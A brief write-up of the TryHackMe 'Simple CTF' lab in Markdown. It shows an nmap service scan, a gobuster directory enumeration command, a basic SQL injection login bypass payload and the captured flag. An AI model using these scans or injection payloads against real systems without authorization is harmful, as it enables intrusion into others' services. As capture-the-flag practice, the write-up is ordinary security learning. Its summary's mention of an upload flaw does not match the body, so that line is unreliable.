---
title: Simple CTF
date: 2026-03-15
platform: TryHackMe
category: Web
difficulty: easy
url: https://tryhackme.com/room/simplectf
lang: en
tags: [web, sqli, linux]
summary: First contact with web exploitation. Found an exposed directory and an upload flaw.
---

# Simple CTF — TryHackMe

## Reconnaissance

Ran `nmap -sV 10.10.123.45` and found:

- Port 21 (FTP)
- Port 80 (HTTP)
- Port 2222 (SSH)

## Enumeration

The site on port 80 was running **Apache**. I used Gobuster:

```bash
gobuster dir -u http://10.10.123.45 -w /usr/share/wordlists/dirb/common.txt
```

Found the `/simple/` directory.

## Exploitation

The login was vulnerable to **SQL Injection**:

```sql
' OR 1=1--
```

## Flag

`flag{encontrei_a_flag_aqui}`

## What I learned

- Nmap with `-sV` shows service versions
- Basic SQL Injection still works
- Always run Gobuster on Apache sites